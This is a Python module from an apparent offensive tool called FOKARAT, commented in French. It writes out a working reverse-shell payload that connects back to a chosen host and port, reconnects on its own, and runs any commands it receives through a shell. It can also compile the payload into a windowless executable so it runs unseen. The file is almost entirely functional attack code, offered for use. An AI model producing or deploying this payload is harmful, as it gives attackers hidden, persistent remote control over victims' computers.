"""FOKARAT - Générateur Python reverse shell"""
import os
import subprocess
import shutil
from core.module_interface import ModuleInterface
from core.logger import Logger
from core.utils import ask_lhost_lport, ensure_dir, which

logger = Logger()


class PythonPayloadGenerator(ModuleInterface):
    def get_metadata(self):
        return {
            "name": "Python Reverse Shell",
            "version": "1.0",
            "type": "generator",
            "description": "Reverse shell Python avec reconnexion automatique."
        }

    def run(self, config):
        lhost, lport = ask_lhost_lport(config)
        logger.info(f"Génération du payload Python pour {lhost}:{lport}...")

        payload_code = f'''#!/usr/bin/env python3
import socket, subprocess, os, time, sys, platform

LHOST = "{lhost}"
LPORT = {lport}

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((LHOST, LPORT))
            s.send((f"[+] Shell from {{platform.node()}} ({{platform.system()}})\\n").encode())
            while True:
                cmd = s.recv(4096).decode("utf-8", errors="ignore")
                if not cmd: break
                if cmd.strip().lower() in ("exit", "quit"): s.close(); sys.exit(0)
                if cmd.strip().lower().startswith("cd "):
                    try: os.chdir(cmd.strip()[3:]); s.send(b"[+] OK\\n")
                    except Exception as e: s.send(f"[-] {{e}}\\n".encode())
                    continue
                try:
                    out = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
                    s.send((out.stdout + out.stderr or "[+] OK\\n").encode())
                except Exception as e:
                    s.send(f"[-] {{e}}\\n".encode())
            s.close()
        except Exception:
            time.sleep(5)

if __name__ == "__main__":
    connect()
'''

        out_dir = ensure_dir(config.get("output_dir", "output"))
        py_path = os.path.join(out_dir, "payload_python.py")
        with open(py_path, "w", encoding="utf-8") as f:
            f.write(payload_code)
        logger.success(f"Script Python : {py_path}")

        choice = input("  [>] Compiler en .exe (PyInstaller) ? (o/n) : ").strip().lower()
        if choice == "o":
            if not which("pyinstaller"):
                logger.error("PyInstaller absent. pip install pyinstaller")
                return {"status": "success", "payload_path": py_path, "type": "python"}
            logger.info("Compilation PyInstaller...")
            try:
                subprocess.run([
                    "pyinstaller", "--onefile", "--noconsole",
                    "--distpath", out_dir,
                    "--workpath", os.path.join(out_dir, "build"),
                    "--specpath", out_dir,
                    "--name", "payload_python", py_path
                ], capture_output=True, check=True)
                exe = os.path.join(out_dir, "payload_python")
                if os.path.exists(exe):
                    logger.success(f"Exécutable : {exe}")
                    return {"status": "success", "payload_path": exe, "type": "exe"}
            except subprocess.CalledProcessError as e:
                logger.error(f"PyInstaller : {e}")
        return {"status": "success", "payload_path": py_path, "type": "python"}